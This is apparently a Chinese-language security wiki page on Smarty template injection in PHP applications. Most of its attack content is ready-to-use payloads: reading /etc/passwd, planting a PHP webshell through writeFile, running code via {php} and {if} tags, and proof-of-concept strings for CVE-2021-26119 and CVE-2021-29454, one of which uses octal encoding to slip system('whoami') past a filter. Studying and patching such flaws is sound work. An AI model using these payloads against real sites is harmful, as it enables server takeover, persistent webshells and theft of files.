---
tags:
    - PHP
    - Web Sec
comments: true
---
# Smarty 模板注入

[Smarty](https://github.com/smarty-php/smarty){target="_blank"}是最流行的PHP模板语言之一，为不受信任的模板执行提供了安全模式。这会强制执行在 php 安全函数白名单中的函数，因此我们在模板中无法直接调用 php 中直接执行命令的函数(相当于存在了一个disable_function)

## 攻击方式
通过self获取到smarty内置变量后，`{$smarty}` 可以访问到一些内置函数，如 `{$smarty.version}` 可以获取当前 smarty 版本号。通过这个变量，我们可以获取到一些内置函数，如 `{$smarty.now}` 可以获取当前时间戳，`{$smarty.const.PHP_VERSION}` 可以获取 php 版本号。

### getStreamVariable()

getStreamVariable() 这个方法可以获取传入变量的流，通过这个方法我们可以获取到文件内容，如 `{self::getStreamVariable("file:///etc/passwd")}` 

!!! Failure 
    Smarty 3.1.30 已经将 getStreamVariable 静态方法删除

### writeFile()

```php
<?php
public function writeFile($_filepath, $_contents, Smarty $smarty)
//我们可以发现第三个参数$smarty其实就是一个smarty模板类型，要求是拒绝非Smarty类型的输入，这就意味着我们需要获取对Smarty对象的引用
//在smarty中有 self::clearConfig()：
public function clearConfig($varname = null)
{
    return Smarty_Internal_Extension_Config::clearConfig($this, $varname);
}
?>
```

构造payload写webshell：

```php
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php eval($_GET['cmd']); ?>",self::clearConfig())}
```

### 标签

1. `{php} {/php}` 中间的内容会被当做php代码执行
2. `{literal}` 可以让一个模板区域的字符原样输出。 这经常用于保护页面上的Javascript或css样式表，可以实现xss或php5代码执行
3. `{if}{/if}` if语句内可以执行php代码，如 `{if phpinfo()}{/if}`


## 漏洞复现
### CVE-2021-26120
[Todo](/todo)

### CVE-2021-26119
**漏洞原因**：可以通过 {$smarty.template_object} 访问到 smarty 对象<br/>
**修复版本**：3.1.39<br/>
**PoC**: ```string:{$smarty.template_object->smarty->_getSmartyObj()->display('string:{system(whoami)}')}```

### CVE-2021-29454

**漏洞原因**：`libs/plugins/function.math.php` 中的 `smarty_function_math` 执行了 eval()，而 eval() 的数据可以通过 8 进制数字绕过正则表达式

**修复版本**：3.1.42 和 4.0.2 

**PoC**: ```eval:{math equation='("\163\171\163\164\145\155")("\167\150\157\141\155\151")'}```


## 参考资料
[Smarty 最新 SSTI 总结](https://xz.aliyun.com/t/11108){target="_blank"}